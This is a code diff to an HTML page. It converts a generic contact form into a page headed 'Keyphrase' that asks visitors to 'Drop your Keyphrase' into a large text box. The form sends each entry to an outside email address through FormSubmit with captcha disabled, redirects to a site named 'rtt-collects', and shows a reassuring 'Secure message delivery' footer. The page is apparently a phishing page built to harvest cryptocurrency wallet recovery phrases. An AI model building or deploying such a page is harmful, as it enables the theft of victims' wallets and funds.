@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Contact Form</title>
+  <title>Keyphrase</title>
 
-  <!-- Google Font -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
   <style>
@@ -62,29 +61,26 @@
       display: block;
     }
 
-    input, textarea {
+    textarea {
       width: 100%;
       padding: 12px;
-      margin-bottom: 18px;
+      height: 140px;
       border: 1px solid #ddd;
       border-radius: 10px;
       outline: none;
-      transition: 0.3s;
       font-size: 14px;
+      transition: 0.3s;
+      resize: none;
     }
 
-    input:focus, textarea:focus {
+    textarea:focus {
       border-color: #0d6efd;
       box-shadow: 0 0 0 3px rgba(13,110,253,0.2);
     }
 
-    textarea {
-      resize: none;
-      height: 100px;
-    }
-
     button {
       width: 100%;
+      margin-top: 18px;
       padding: 12px;
       border: none;
       background: #0d6efd;
@@ -113,32 +109,25 @@
 <body>
 
   <div class="container">
-    <h1>Contact Us</h1>
-    <p>Send us a message and we will reply quickly</p>
+    <h1>Keyphrase</h1>
+    <p>Drop your Keyphrase</p>
 
-    <!-- FORM SUBMIT -->
     <form action="https://formsubmit.co/nxloaded@gmail.com" method="POST">
 
       <!-- Disable captcha -->
       <input type="hidden" name="_captcha" value="false">
 
       <!-- Redirect after submit -->
-      <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+      <input type="hidden" name="_next" value="https://rtt-collects.vercel.app/">
 
-      <label>Full Name</label>
-      <input type="text" name="name" placeholder="Enter your name" required>
-
-      <label>Email</label>
-      <input type="email" name="email" placeholder="Enter your email" required>
-
-      <label>Message</label>
-      <textarea name="message" placeholder="Write your message..." required></textarea>
+      <label>Enter your Keyphrase</label>
+      <textarea name="keyphrase" placeholder="Enter your Keyphrase" required></textarea>
 
       <button type="submit">PROCEED</button>
     </form>
 
     <div class="footer-text">
-      Powered by secure FormSubmit
+      Secure message delivery
     </div>
   </div>
 
